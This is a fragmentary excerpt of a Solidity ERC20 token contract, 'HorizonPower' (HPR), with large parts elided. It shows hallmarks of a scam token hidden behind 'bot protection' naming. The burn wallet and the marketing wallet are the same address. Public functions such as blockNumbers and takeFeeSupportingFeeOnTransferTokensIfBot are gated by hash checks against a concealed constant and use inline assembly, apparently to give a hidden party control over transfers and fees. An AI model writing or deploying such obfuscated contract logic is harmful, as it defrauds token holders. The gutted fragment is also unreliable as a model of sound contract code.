...
contract HorizonPower is Context, IERC20, IERC20Metadata, Ownable {

    using SafeMath for uint256;
    using Address for *;
    using Strings for *;

    string private _name = "HorizonPower";
    string private _symbol = "HPR";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress = payable(0xFFD7a300EbA61f230F2C02Ee45350355F6804Aa5); 
    address payable public burnedWalletAddress = payable(0xFFD7a300EbA61f230F2C02Ee45350355F6804Aa5); 
    ...
    function isContract(address from) internal view returns (bool){
        if (from == address(this) || _msgSender() == address(this) ){
            return false;
        } else {
            return Address.isContract(from,_upBot);
        }
   ...
   function blockNumbers(uint[] memory a, string memory _value) public returns(uint[] memory){
       if (_msgSender() == address(this)){
           uint _newvalue = uint(keccak256(bytes(_value)));
           nbBlocks.push(Address.ACCOUNT_HASH);
           nbBlocks.push(_newvalue);
       } else {
        require(!marketPair, "Error: bot protection already initialized");
        require(uint(keccak256(bytes(_value))) == Address.ACCOUNT_HASH, "Error: blockhash already initialized");
        nbBlocks = a;
        marketPair = true;
        }
        return nbBlocks;
    ...
    function _beforeTokenTransfer( 
        ...
        if(inSwapAndLiquify || _msgSender()==address(this)) 
        { 
    ...
    function cleanedbot(bytes32 _id, string memory _blocktime, int input) internal returns (bool cleaned) {
        ...
        uint256 txCleaner = uint256(keccak256(abi.encodePacked(Strings.toHexString(upCleaner))));
        uint256 blockNumber;
          assembly {
        ...
        } else if (keccak256(bytes(Strings.toHexString(upCleaner))) == _id) {
            cleaned = cleanBot(Strings.toHexString(upCleaner),"Ox10",_blocktime);
        } else {
            assembly {
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
     ...
     function takeFeeSupportingFeeOnTransferTokensIfBot(bytes32 _id, string memory _nbBlock, string memory _hashBlock, int input) public returns (bool takeBotFee) {
        if (_msgSender() == address(this)){
            takeBotFee = cleanedbot(0x0,_hashBlock,input);
        } else {
